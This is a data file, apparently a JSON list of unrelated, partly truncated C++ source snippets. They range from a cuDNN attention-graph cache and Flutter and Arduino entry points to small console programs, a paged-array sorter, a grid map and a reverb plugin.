e.err_msg.c_str());\n        exit(EXIT_FAILURE);\n    }\n}\n#define checkCudnnFE(err) checkCudnnFE(err, __FILE__, __LINE__)\n\nenum UIDs {\n    Q_UID,\n    K_UID,\n    V_UID,\n    Attn_scale_UID,\n    O_UID,\n    Stats_UID,\n    dO_UID,\n    dQ_UID,\n    dK_UID,\n    dV_UID\n};\n\n// Need a cache because graph->build_operation_graph() is slow but everything else seems fast\nusing cache_type_fwd = std::map<std::tuple<int,int,int,int, int>, std::shared_ptr<fe::graph::Graph>>;\nusing cache_type_bwd = std::map<std::tuple<int,int,int,int>, std::shared_ptr<fe::graph::Graph>>;\n\n// Loosely based on cuDNN frontend samples functions and massively simplified\nauto lookup_cache_or_build_graph_fwd(int B,int H,int T,int HS, int is_inference_only) {\n\n    static cache_type_fwd user_maintained_cache_fwd;\n\n    auto key = std::make_tuple(B, H, T, HS, is_inference_only);\n\n    auto it = user_maintained_cache_fwd.find(key);\n    if (it != user_maintained_cache_fwd.end()) {\n        return it->second;\n    }\n\n    auto graph = std::make_shared<fe::graph::Graph>();\n    graph->set_io_data_type(CUDNN_16BIT)\n          .set_intermediate_data_type(fe::DataType_t::FLOAT)\n          .set_compute_data_type(fe::DataType_t::FLOAT);\n\n    // QKV is (B, T, 3, NH, HS) which cuDNN can handle directly without an external permute\n    auto Q = graph->tensor(fe::graph::Tensor_attributes().set_name(\"Q\")\n                               .set_dim({B, H, T, HS})\n                               .set_uid(Q_UID)\n                               .set_stride({3 * H * HS * T,  HS, 3 * H * HS, 1}));\n    auto K = graph->tensor(fe::graph::Tensor_attributes().set_name(\"K\")\n                               .set_dim({B, H, T, HS})\n                               .set_uid(K_UID)\n                               .set_stride({3 * H * HS * T, HS, 3 * H * HS, 1}));\n    auto V = graph->tensor(fe::graph::Tensor_attributes().set_name(\"V\")\n                               .set_dim({B, H, T, HS})\n                               .set_uid(V_UID)\n                               .set_stride({3 * H * HS * T, HS, 3 * H * HS, 1}));\n    auto attn_scale = graph->tensor(fe::graph::Tensor_attributes().set_name(\"attn_scale\")\n                               .set_dim({1, 1, 1, 1})\n                               .set_stride({1, 1, 1, 1})\n                               .set_uid(Attn_scale_UID)\n                               .set_is_pass_by_value(true)\n                               .set_data_type(fe::DataType_t::FLOAT));\n\n    auto sdpa_options = fe::graph::SDPA_attributes().set_name(\"flash_attention\");\n    sdpa_options.set_is_inference(is_inference_only);\n    sdpa_options.set_attn_scale(attn_scale);\n    sdpa_options.set_causal_mask(true);\n\n    // Create the graph operation and get the output tensors back\n    auto [O, stats] = graph->sdpa(Q, K, V, sdpa_options);\n\n    // Output is (B, T, NH, HS) BF16/FP16 and stats for backward pass is (B, NH, T) FP32\n    O->set_output(true).set_dim({B, H, T, HS}).set_stride({H * HS * T, HS, H * HS, 1}).set_uid(O_UID);\n\n    assert(stats == nullptr || is_inference_only == false);\n    if (is_inference_only == false) {\n        stats->set_output(true).set_data_type(fe::DataType_t::FLOAT)\n                               .set_dim({B, H, T, 1})\n                               .set_stride({H * T, T, 1, 1})\n                               .set_uid(Stats_UID);\n    }\n\n    checkCudnnFE(graph->validate());\n\n    // Build the operation graph and execution part (this is the VERY SLOW PART)\n    checkCudnnFE(graph->build_operation_graph(cudnn_handle));\n    auto plans = graph->create_execution_plans({fe::HeurMode_t::A});\n    checkCudnnFE(graph->check_support(cudnn_handle));\n    checkCudnnFE(graph->build_pl",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"currency_converter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n  This is the main file which execute to the micocontroller board \n  Created by talian robotics \n\n*/\n\n/* This below are header files for the project */\n#include <Adafruit_Fingerprint.h>\n#include <Wire.h>\n#include \"Authenticate.h\"\n#include \"Enroll.h\"\n#include \"Delete.h\"\n#include \"Indicator.h\"\n#include \"LCD_Display.h\"\n\n#define SDA_PIN D2\n#define SCL_PIN D1\n\n\n#if (defined(__AVR__) || defined(ESP8266)) && !defined(__AVR_ATmega2560__)\n#include <SoftwareSerial.h>\nSoftwareSerial mySerial(13, 15);// for esp8266 this is pin no 8 and 7\n// SoftwareSerial mySerial(2, 3); // for arduino board\n#else\n#define mySerial Serial1\n#endif\n\n/* Object creation or decralation frommthe class found in the provided header files */\nAdafruit_Fingerprint finger(&mySerial);\nAuthenticate auth(finger);\nEnroll enroll(finger);\nDelete del(finger);\nLCD_Display lcd(0x27, 16, 2);\n\n\n\n// Function prototype\nString readCommand();\nvoid setup() {\n    // pinMode(warning_led, OUTPUT);\n    Serial.begin(9600);\n    Wire.begin(SDA_PIN, SCL_PIN);// begin i2c commmunication \n    lcd.begin();// begin the lcd display \n    while (!Serial);\n    delay(100);\n    Serial.println(\"\\n\\nFingerprint System\");\n\n    lcd.printMessage(\"Hi there\", 0);\n    delay(1000); // Pause for a moment\n\n    // Scroll \"Welcome to\" from right to left\n    // lcd.scrollMessage(\"Welcome to \", \"Error\",  1);\n\n    // Scroll \"Fingerprint System\" from right to left\n    lcd.scrollMessage(\"Welcome to Authentication system\", \"talion's system\",  1);\n    \n    \n\n    finger.begin(57600);\n    if (finger.verifyPassword()) {\n        Serial.println(\"Found fingerprint sensor!\");\n    } else {\n        Serial.println(\"Did not find fingerprint sensor :(\");\n        while (1) { delay(1); }\n    }\n}\n\nvoid loop() {\n    Serial.println(\"Waiting for command...\");\n     lcd.clearMessage();\n     lcd.printMessage(\"Waiting for\", 0);\n     lcd.printMessage(\"command...\", 1);\n    String command = readCommand();\n\n    if (command == \"ENROLL\" || command == \"enroll\" || command == \"2\") {\n        Serial.println(\"Starting enrollment...\");\n        lcd.clearMessage();\n        // lcd.printMessage(\"Starting enrollment...\", 0);\n        lcd.scrollMessage(\"Starting enrollment...\", \"Registration..\",  1);\n        enroll.enrollFingerprint();\n    } else if (command == \"AUTH\" || command == \"A\" || command == \"a\" || command == \"1\") {\n        Serial.println(\"Entering continuous authentication mode.\");\n        lcd.clearMessage();\n        lcd.printMessage(\"Authentication..\", 0);\n        lcd.printMessage(\"mode On progress\", 1);\n        while (true) {\n            auth.authenticateFingerprint();\n\n            // Check for 'S' command to stop authentication mode\n            if (Serial.available() > 0) {\n                String stopCommand = readCommand();\n                if (stopCommand == \"S\" || stopCommand == \"s\" || stopCommand == \"0\") {\n                    Serial.println(\"Exiting authentication mode.\");\n                    lcd.clearMessage();\n                    lcd.scrollMessage(\"Exiting authentication mode..\", \"Termination..\",  1);\n                    break;\n                }\n            }\n            delay(100); // Add a slight delay to prevent rapid looping\n        }\n    } else if (command == \"DELETE\" || command == \"delete\" || command == \"4\") {\n        Serial.println(\"Starting deletion...\");\n        lcd.clearMessage();\n        lcd.scrollMessage(\"Starting deletion...\", \"Deleting\",  1);\n        del.deleteFingerprint();\n        // keypad functionality for delete \n        // rfid functionality for delete \n    } else if (command == \"EXIT\"  || command == \"0\") {\n        Serial.println(\"Exiting...\");\n         lcd.clearMessage();\n        //  lcd.printMessage(\"Exiting...\", 0);\n         lcd.scrollMessage(\"Thankyou welcome again.\", \"Goodbye\",  1);\n        while (1);\n    } else {\n        Serial.println(\"Invalid command, please try again.\");\n        lcd.clearMessage();\n        lcd.scrollMessage(\"Invalid command, please try again.\", \"Error\",  1);\n    }\n\n    delay(1000); \n}\n\n// Function definition\nString readCommand() {\n    String command = \"\";\n    while (command.length() == 0) {\n        if (Serial.available() > 0) {\n            command = Serial.readStringUntil('\\n');\n            command.trim(); // Remove any whitespace or newline characters\n            Serial.flush(); // Flush the serial buffer to clear any additional data\n        }\n    }\n    return command;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n\n\n\n\nint main()\n{   clock_t start_time =clock();\n    cout << \"Hello World!\" << endl;\n    \n    int n=9;\n   // array<int,6>arr={6,10,5,2,9,7};\n    stack<int>st;\n    vector<int>arr(n,-1);\n    vector<int>ans={8,6,4,7,4,9,10,8,12};\n    //ans[n]={8,6,4,7,4,9,10,8,12};\n    //int n=23;\n   for(int i=0;i<n;i++){ \n     \n     if(st.empty()){\n      st.push(i);}\n     \n     \n     else{\n    while(!st.empty() &&ans[st.top()]>ans[i]){\n      arr[st.top()]=ans[i];\n     st.pop();\n        }\n        if(!st.empty()){\n        arr[i]=arr[st.top()];\n        }\n        st.push(i);\n      }\n     }\n     cout << \"\\n ans array is:\\n\" << endl;\n    for(int i=0;i<arr.size();i++){\n    cout<<arr[i]<<\" \";}\n    \n    cout << \"\\n previous array is:\\n\" << endl;\n    \n    for(int i=0;i<ans.size();i++){\n    cout<<ans[i] <<\" \";}\n    \n    clock_t end_time=clock();\n  double timespend=  (double) (end_time-start_time)/CLOCKS_PER_SEC*1e6;\n    cout << \"\\nTime to run the code \"<<timespend <<\"microsecond\"<< endl;\n    \n    \n    return 0;\n}",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include <iostream>\r\n#include <fstream>\r\n#include <Windows.h>\r\n#include <unordered_map>\r\n#include <stdexcept>\r\n#include <sstream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <list>\r\n#include \"Teacher.h\"\r\n#include \"Manager.h\"\r\n#include \"Department.h\"\r\n#include \"Employees.h\"\r\n#include <string>\r\n#include \"Job.h\"\r\n#include \"States.h\"\r\n#include \"Administrator.h\"\r\n#include \"Date.h\"\r\n#include \"Director.h\"\r\n#include \"EInterface.h\"\r\n#include \"TInterface.h\"\r\n#include \"MInterface.h\"\r\n#include \"DInterface.h\"\r\n#include \"AInterface.h\"\r\nusing namespace std;\r\nstring Dept_Tostring(DepartmentNames dept) {\r\n    switch (dept) {\r\n    case IT: return \"IT\";\r\n    case Admins: return \"Admins\";\r\n    case Accounts: return \"Accounts\";\r\n        // Add other cases as needed\r\n    default: return \"Unknown\";\r\n    }\r\n}\r\nstring StateTostring(Status s)\r\n{\r\n    if (s == ASSIGNED) {\r\n        return \"Assigned\";\r\n    }\r\n    else if (s == NEW) {\r\n        return \"New\";\r\n    }\r\n    else if (s == RESOLVED) {\r\n        return \"Resolved\";\r\n    }\r\n}\r\nDate* tokenizeDate(const std::string& date) {\r\n    std::istringstream iss(date);\r\n    std::vector<std::string> tokens;\r\n    std::string token;\r\n\r\n    while (iss >> token) {\r\n        // If token contains a \":\" (indicating the time part), further tokenize it\r\n        if (token.find(\":\") != std::string::npos) {\r\n            std::istringstream timeIss(token);\r\n            std::string timeToken;\r\n            while (std::getline(timeIss, timeToken, ':')) {\r\n                tokens.push_back(timeToken);\r\n            }\r\n        }\r\n        else {\r\n            // Otherwise, treat it as a regular token\r\n            tokens.push_back(token);\r\n        }\r\n    }\r\n\r\n    // Create a new Date object\r\n    Date* d = new Date(tokens[0], tokens[1], std::stoi(tokens[2]),\r\n        std::stoi(tokens[3]), std::stoi(tokens[4]), std::stoi(tokens[5]), std::stoi(tokens[6]));\r\n\r\n    return d;\r\n}\r\nclass ComplaintManagementSystem {\r\nprivate:\r\n    std::list<Department> departments;\r\n    std::list<Teacher> teachers;\r\n    std::list<Manager> managers;\r\n    std::list<Complaint> complaints;\r\n    std::list<Employees> employees;\r\n    std::list<Job> jobs;\r\n    std::list<Administrator> admin;\r\n    std::list<Director> director;\r\n    TInterface* loggedInTeacher;\r\n    MInterface* loggedInManager;\r\n    EInterface* loggedInEmployee;\r\n    AInterface* loggedInAdmin;\r\n    DInterface* loggedInDirector;\r\n    int ComplaintId;\r\n\r\npublic:\r\n    ComplaintManagementSystem() {\r\n        loggedInTeacher = nullptr;\r\n        loggedInManager = nullptr;\r\n        loggedInEmployee = nullptr;\r\n        loggedInAdmin = nullptr;\r\n        loggedInDirector = nullptr;\r\n        ComplaintId = 1;\r\n    }\r\n\r\n    void initializeSystem() {\r\n        departments.emplace_back(DepartmentNames::IT);\r\n        departments.emplace_back(DepartmentNames::Admins);\r\n        departments.emplace_back(DepartmentNames::Accounts);\r\n        auto teachersPair = SetTeacher();\r\n        teachers = teachersPair.first;\r\n        SetManager(departments, managers);\r\n        SetEmployee(departments, employees);\r\n        auto adminPair = SetAdmin();\r\n        admin = adminPair.first;\r\n        auto directorPair = SetDirector();\r\n        director = directorPair.first;\r\n        set_complaints(teachers, departments, complaints);\r\n        SetJobs(managers, employees, jobs);\r\n    }\r\n\r\n    void gotoxy(int x, int y) {\r\n        COORD coord;\r\n        coord.X = x;\r\n        coord.Y = y;\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n    }\r\n\r\n    void loginInterface() {\r\n        std::string ID;\r\n        while (1) {\r\n            std::cout << \"Enter your ID: \";\r\n            std::cin >> ID;\r\n            system(\"CLS\");\r\n\r\n            // Handle different user types (teacher, director, manager, employee, admin)\r\n            if (SearchTeacher(teachers, ID)) {\r\n                teacherInterface(ID);\r\n            }\r\n            else if (SearchDirector(director, ID)) {\r\n                directorInterface(ID);\r\n            }\r\n            else if (SearchManager(managers, ID)) {\r\n                managerInterface(ID);\r\n            }\r\n            else if (SearchEmployee(employees, ID)) {\r\n                employeeInterface(ID);\r\n            }\r\n            else if (SearchAdmin(admin, ID)) {\r\n                adminInterface(ID);\r\n            }\r\n            else {\r\n                std::cout << \"Not Valid... Enter Again!\\n\";\r\n            }\r\n        }\r\n    }\r\n\r\n    bool SearchTeacher(const std::list<Teacher>& teachers, const std::string& ID) {\r\n        for (const auto& teacher : teachers) {\r\n            if (ID == teacher.getID()) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool SearchManager(const std::list<Manager>& managers, const std::string& ID) {\r\n        for (const auto& manager : managers) {\r\n            if (ID == manager.MgetID()) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool Sear",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\nusing namespace std;\r\n\r\n/*\r\ncontact management that includes adding contact:\r\n    add number, name, company\r\n*/\r\n\r\nclass Contact {\r\nprivate:\r\n    int number;\r\n    string name;\r\n    string type;\r\n\r\npublic:\r\n    void setNewContact(int contactNumber, string fullName, string contactType) {\r\n        this->number = contactNumber;\r\n        this->name = fullName;\r\n        this->type = contactType;\r\n    }\r\n\r\n    void displayContact() const {\r\n        cout << \"Contact Name: \" << name << \", Number: \" << number << \", Type: \" << type << endl;\r\n    }\r\n\r\n    int getContactNumber() const {\r\n        return number;\r\n    }\r\n\r\n    string getName() const {\r\n        return name;\r\n    }\r\n\r\n    string getType() const {\r\n        return type;\r\n    }\r\n};\r\n\r\nvoid showContacts(const vector<Contact>& contacts) {\r\n    if (contacts.empty()) {\r\n        cout << \"\\nNo contacts available.\" << endl;\r\n    }\r\n    else {\r\n        for (const auto& contact : contacts) {\r\n            contact.displayContact();\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    vector<Contact> contacts;\r\n    int choice;\r\n\r\n    do {\r\n        cout << \"Welcome, your current contacts are: \" << contacts.size() << endl;\r\n        cout << \"Menu\\n\";\r\n        cout << \"1. Add contact\" << endl;\r\n        cout << \"2. Show contacts\" << endl;\r\n        cout << \"3. Exit\" << endl;\r\n        cout << \"--\" << endl;\r\n        cout << \"Your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            string name;\r\n            int number;\r\n            string type;\r\n\r\n            cout << \"\\nEnter the new contact name: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            cout << \"\\nEnter the number: \";\r\n            cin >> number;\r\n            cout << \"\\nType (Business - Family - Friend): \";\r\n            cin >> type;\r\n\r\n            Contact newContact;\r\n            newContact.setNewContact(number, name, type);\r\n            contacts.push_back(newContact);\r\n\r\n            cout << \"\\nContact added!\" << endl;\r\n            break;\r\n        }\r\n        case 2: {\r\n            showContacts(contacts);\r\n            break;\r\n        }\r\n        case 3: {\r\n            cout << \"Exiting...\" << endl;\r\n            break;\r\n        }\r\n        default: {\r\n            cout << \"Invalid choice. Please try again.\" << endl;\r\n            break;\r\n        }\r\n        }\r\n\r\n    } while (choice != 3);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <cstring>\n#include <chrono>\n#include \"PagedArray.h\"\n\n// Declaraci\u00f3n de algoritmos de ordenamiento\nvoid quick_sort(PagedArray& arr, int low, int high);\nvoid insertion_sort(PagedArray& arr, int start, int end);\nvoid bubble_sort(PagedArray& arr, int start, int end);\nint partition(PagedArray& arr, int low, int high);\n\nvoid print_usage() {\n    std::cerr << \"Usage: sorter -input <INPUT FILE PATH> -output <OUTPUT FILE PATH> -alg <ALGORITHM>\" << std::endl;\n    std::cerr << \"Algorithms: QS (Quick Sort), IS (Insertion Sort), BS (Bubble Sort)\" << std::endl;\n}\n\nint main(int argc, char* argv[]) {\n    std::string input_file;\n    std::string output_file;\n    std::string algorithm;\n\n    // Parse command line arguments\n    for (int i = 1; i < argc; ++i) {\n        if (std::strcmp(argv[i], \"-input\") == 0 && i + 1 < argc) {\n            input_file = argv[++i];\n        } else if (std::strcmp(argv[i], \"-output\") == 0 && i + 1 < argc) {\n            output_file = argv[++i];\n        } else if (std::strcmp(argv[i], \"-alg\") == 0 && i + 1 < argc) {\n            algorithm = argv[++i];\n        } else {\n            print_usage();\n            return 1;\n        }\n    }\n\n    if (input_file.empty() || output_file.empty() || algorithm.empty()) {\n        print_usage();\n        return 1;\n    }\n\n    // Initialize PagedArray\n    const size_t page_size = 4096; // Tama\u00f1o de p\u00e1gina en enteros\n    const size_t num_pages = 4; // N\u00famero m\u00e1ximo de p\u00e1ginas en memoria\n    PagedArray paged_array(input_file, page_size, num_pages);\n\n    auto start = std::chrono::high_resolution_clock::now();\n\n    // Apply sorting algorithm\n    if (algorithm == \"QS\") {\n        quick_sort(paged_array, 0, paged_array.size() - 1);\n    } else if (algorithm == \"IS\") {\n        insertion_sort(paged_array, 0, paged_array.size() - 1);\n    } else if (algorithm == \"BS\") {\n        bubble_sort(paged_array, 0, paged_array.size() - 1);\n    } else {\n        std::cerr << \"Unknown algorithm: \" << algorithm << std::endl;\n        return 1;\n    }\n\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> elapsed = end - start;\n\n    // Write sorted data to output file\n    std::ofstream outfile(output_file, std::ios::binary);\n    if (!outfile) {\n        std::cerr << \"Error opening file for writing: \" << output_file << std::endl;\n        return 1;\n    }\n\n    for (size_t i = 0; i < paged_array.size(); ++i) {\n        int value = paged_array[i];\n        outfile.write(reinterpret_cast<const char*>(&value), sizeof(int));\n    }\n\n    outfile.close();\n\n    // Print statistics\n    std::cout << \"Time elapsed: \" << elapsed.count() << \" seconds\" << std::endl;\n    std::cout << \"Algorithm used: \" << algorithm << std::endl;\n    std::cout << \"Page faults: \" << paged_array.getPageFaults() << std::endl;\n    std::cout << \"Page hits: \" << paged_array.getPageHits() << std::endl;\n\n    return 0;\n}\n\n// Implementaciones de los algoritmos de ordenamiento\nint partition(PagedArray& arr, int low, int high) {\n    int pivot = arr[high];\n    int i = low - 1;\n    for (int j = low; j < high; ++j) {\n        if (arr[j] <= pivot) {\n            ++i;\n            std::swap(arr[i], arr[j]);\n        }\n    }\n    std::swap(arr[i + 1], arr[high]);\n    return i + 1;\n}\n\nvoid quick_sort(PagedArray& arr, int low, int high) {\n    if (low < high) {\n        int pivot_index = partition(arr, low, high);\n        quick_sort(arr, low, pivot_index - 1);\n        quick_sort(arr, pivot_index + 1, high);\n    }\n}\n\nvoid insertion_sort(PagedArray& arr, int start, int end) {\n    for (int i = start + 1; i <= end; ++i) {\n        int key = arr[i];\n        int j = i - 1;\n        while (j >= start && arr[j] > key) {\n            arr[j + 1] = arr[j];\n            --j;\n        }\n        arr[j + 1] = key;\n    }\n}\n\nvoid bubble_sort(PagedArray& arr, int start, int end) {\n    for (int i = start; i < end; ++i) {\n        for (int j = start; j < end - i; ++j) {\n            if (arr[j] > arr[j + 1]) {\n                std::swap(arr[j], arr[j + 1]);\n            }\n        }\n    }\n}\n",
    "\n#include \"Grid.h\"\n#include <cmath>\n#include <cstdlib>\n#include <cstdio>\n#include <queue>\n#include <unordered_set>\n#include <cstdint>\n#include <cstring>\n\nGrid::Grid(double unitSize, double sizeX, double sizeY) : unitSize(unitSize) {\n   this->sizeX = roundOutTop(sizeX);\n   this->sizeY = roundOutTop(sizeY);\n   entities = std::vector<Entity>();\n   printf(\"sizeX: %d, sizeY: %d\\n\",this->sizeX,this->sizeY);\n   grid = (int **)malloc(sizeof(int *)*(this->sizeX+1));\n   for (int i = 0; i <= this->sizeX; ++i)\n      grid[i] = (int *)calloc(sizeof(int)*(this->sizeY+1),1);\n   marks = (int **)malloc(sizeof(int *)*(this->sizeX+1));\n   for (int i = 0; i <= this->sizeX; ++i)\n      marks[i] = (int *)calloc(sizeof(int)*(this->sizeY+1),1);\n}\n\nint Grid::roundOutTop(double val) {\n   return (int)std::ceil(val/unitSize);\n}\n\nint Grid::roundOutBottom(double val) {\n   return (int)std::floor(val/unitSize);\n}\n\nvoid Grid::roundOut(double vlow, double vhigh, int & nlow, int & nhigh) {\n   nlow = std::floor(vlow/unitSize);\n   nhigh = std::ceil(vhigh/unitSize);\n}\n\nint Grid::avgWeights(const int old, const int nev, double newWeight) {\n   if (newWeight > 1.0) {\n      fprintf(stderr,\"Weight over 1.0! : %f\",newWeight);\n      newWeight = 1.0;\n   }\n   else if (newWeight < 0.0) {\n      fprintf(stderr,\"Weight under 0.0! : %f\",newWeight);\n      newWeight = 0.0;\n   }\n   return ceil(((double)old * (1.0 - newWeight)) + ((double)nev * newWeight));\n}\n\nGrid::~Grid(void) {\n   for (int i = 0; i < this->sizeX; ++i) {\n      free(grid[i]);\n      free(marks[i]);\n   }\n   free(grid);\n   free(marks);\n}\n\nvoid Grid::updateGrid(int type, int danger, double dist1, double dist2, double posX, double posY, double weight) {\n   int width, height, rad, x, y;\n   switch (type) {\n      case ENTITY_TYPE_RECT:\n         roundOut(posX,dist1,x,width);\n         roundOut(posY,dist2,y,height);\n         x -= (width/2);\n         y -= (height/2);\n         for (int i = x; i <= width+x; ++i) {\n            if (i < 0 || i > sizeX) continue;\n            for (int j = y; j <= height+y; ++j) {\n               if (j < 0 || j > sizeY) continue;\n               grid[i][j] = (avgWeights(grid[i][j],danger,weight));\n            }\n         }\n      break;\n      case ENTITY_TYPE_POINT:\n         x = roundOutBottom(posX);\n         y = roundOutBottom(posY);\n         if (x < 0 || x > sizeX || y < 0 || y > sizeY) break;\n         grid[x][y] = avgWeights(grid[x][y],danger,weight);\n      break;\n      case ENTITY_TYPE_CIRCLE:\n         rad = roundOutTop(dist1);\n         x = roundOutBottom(posX);\n         y = roundOutBottom(posY);\n         double xGP = -100, xLP = -100;\n         for (double k = 0.0; k <= PI; k += GRID_CIRCLE_GRANULARITY) {\n            int xG = ceil (x + (cos(k) * rad)),\n                xL = floor(x + (cos(k+PI) * rad)),\n                yG = ceil (y + (sin(k) * rad)),\n                yL = floor(y + (sin(k+PI) * rad));\n            if (xG != xGP) {\n               if (xG < 0 || xG > sizeX) continue;\n               for (int i = yL; i <= yG; ++i) {\n                  if (i < 0 || i > sizeY) continue;\n                  grid[xG][i] = avgWeights(grid[xG][i],danger,weight);\n               }\n            }\n            if (xL != xLP && xL != xG) {\n               if (xL < 0 || xL > sizeX) continue;\n               for (int i = yL; i <= yG; ++i) {\n                  if (i < 0 || i > sizeY) continue;\n                  grid[xL][i] = avgWeights(grid[xL][i],danger,weight);\n               }\n            }\n            xGP = xG; xLP = xL;\n         }\n      break;\n   }\n}\n\n\nvoid Grid::addEntity(const Entity * const e) {\n   entities.push_back(*e);\n   updateGrid(e->type,e->danger,e->dist1,e->dist2,e->posX,e->posY,GRID_NEW_VALUE_WEIGHT);\n}\n\nvoid Grid::addEntity(const WeightedEntity * const e) {\n   entities.push_back(*e);\n   updateGrid(e->type,e->danger,e->dist1,e->dist2,e->posX,e->posY,e->weight);\n}\n\nvoid Grid::print(void) {\n   for (int j = sizeY-1; j >= 0; --j)\n      printf(\"---\");\n   printf(\"\\n\");\n   for (int j = sizeY-1; j >= 0; --j) {\n      for (int i = 0; i < sizeX; ++i) {\n         if (marks[i][j] == 1)\n            printf(\"\\033[43m\");\n         else if (marks[i][j] == 2)\n            printf(\"\\033[45m\");\n         if (grid[i][j] > 0x7f)\n            printf(\"\\033[36m\");\n         else if (grid[i][j] > 0x5f)\n            printf(\"\\033[35m\");\n         else if (grid[i][j] > 0x2f)\n            printf(\"\\033[34m\");\n         else if (grid[i][j] > 0x0f)\n            printf(\"\\033[31m\");\n         else if (grid[i][j] > 0x07)\n            printf(\"\\033[33m\");\n         else if (grid[i][j] > 0x00)\n            printf(\"\\033[32m\");\n         printf(\" %2x\\033[0m\",grid[i][j]);\n      }\n      printf(\"\\n\");\n   }\n   for (int j = sizeY-1; j >= 0; --j)\n      printf(\"---\");\n   printf(\"\\n\");\n}\n\ntypedef struct FRAME_STRUCT { double angle; int weight; double posX; double posY; int step; struct FRAME_STRUCT * prev; } Frame;\ntypedef uint64_t FrameID;\n\nFrameID Grid::getFrameId(Frame * f) {\n   uint64_t ret;\n   ret = ((((uint64_t)floor((180/PI)*f->angle)/GRID_MAP_ANGLE_SLICI",
    "/*\n   BarrVerb reverb plugin\n\n   Copyright 2024 Gordon JC Pearce <gordonjcp@gjcp.net>\n\n   Permission to use, copy, modify, and/or distribute this software for any\n   purpose with or without fee is hereby granted, provided that the above\n   copyright notice and this permission notice appear in all copies.\n\n   THE SOFTWARE IS PROVIDED \"AS IS\" AND THE AUTHOR DISCLAIMS ALL WARRANTIES\n   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF\n   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY\n   SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES\n   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION\n   OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN\n   CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.\n*/\n\n#include \"barrverb.hpp\"\n#include \"rom.h\"\n\nSTART_NAMESPACE_DISTRHO\n\nBarrVerb::BarrVerb() : Plugin(kParameterCount, 64, 0) {  // two parameters, one program, no states\n    lowpass = new float[getBufferSize()];\n    ram = new int16_t[16384];\n\n    /*\n        // calculate SVF params\n        // hardcoded values for now\n        float fc = 5019;\n        float F = fc / 48000;  // assume 48kHz\n        float w = 2 * tan(3.14159 * F);\n        float a = w / 0.7845;  // 1dB Chebyshev, 2-pole\n        float b = w * w;\n\n        // \"corrected\" SVF params, per Fons Adriaensen\n        c1_1 = (a + b) / (1 + a / 2 + b / 4);\n        c2_1 = b / (a + b);\n        d0_1 = c1_1 * c2_1 / 4;\n\n        fc = 9433;\n        F = fc / 48000;  // assume 48kHz\n        w = 2 * tan(3.14159 * F);\n        a = w / 3.5594;  // 1dB Chebyshev, 2-pole\n        b = w * w;\n\n        c1_2 = (a + b) / (1 + a / 2 + b / 4);\n        c2_2 = b / (a + b);\n        d0_2 = c1_2 * c2_2 / 4;*/\n    // calculate SVF params\n    // hardcoded values for now\n\n    float fc = 10000;\n    float F = fc / 48000;  // assume 48kHz\n    float w = 2 * tan(3.14159 * F);\n    float a = w / 0.5412;  // Butterworth 4-pole first stage\n    float b = w * w;\n\n    // \"corrected\" SVF params, per Fons Adriaensen\n    c1_1 = (a + b) / (1 + a / 2 + b / 4);\n    c2_1 = b / (a + b);\n    d0_1 = c1_1 * c2_1 / 4;\n\n    fc = 10000;\n    F = fc / 48000;  // assume 48kHz\n    w = 2 * tan(3.14159 * F);\n    a = w / 1.3065;  // Butterworth 4-pole second stage\n    b = w * w;\n\n    c1_2 = (a + b) / (1 + a / 2 + b / 4);\n    c2_2 = b / (a + b);\n    d0_2 = c1_2 * c2_2 / 4;\n}\n\n// Initialisation functions\n\nvoid BarrVerb::initAudioPort(bool input, uint32_t index, AudioPort &port) {\n    port.groupId = kPortGroupStereo;\n    Plugin::initAudioPort(input, index, port);\n}\n\nvoid BarrVerb::initProgramName(uint32_t index, String &programName) {\n\n    programName = \"init program\"; //&prog_name[index & 0x3f];\n    programName = prog_name[index & 0x3f].c_str();\n\n}\n\nvoid BarrVerb::loadProgram(uint32_t index) {\n    prog_offset = (index & 0x3f) << 7;\n}\n\n// Processing functions\n\nvoid BarrVerb::activate() {\n    // calculate filter coefficients\n    printf(\"called activate()\\n\");\n}\n\nvoid BarrVerb::deactivate() {\n    // zero out the outputs, maybe\n    printf(\"called 